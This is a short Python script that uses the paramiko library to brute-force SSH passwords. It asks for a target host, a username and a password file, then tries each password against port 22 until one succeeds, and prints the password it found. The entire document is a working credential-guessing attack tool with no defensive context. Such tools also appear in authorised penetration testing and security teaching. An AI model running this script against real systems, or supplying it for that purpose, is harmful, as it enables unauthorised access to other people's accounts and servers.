import paramiko, sys, os, socket, termcolor

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code


host = input('[+] Target address: ')
username = input('[+] SSH username: ')
input_file = input('[+] Passwords file: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!] That file/path does not exist')
    sys.exit(1)

#read password in the line
with open(input_file, 'r')as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found password: ' + password + ' , For account: ' + username), 'green'))
                break
            elif response == 1:
                print('[-] Incorrect login: ' + password)
            elif response == 2:
                print("[!!] Can't connect")
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
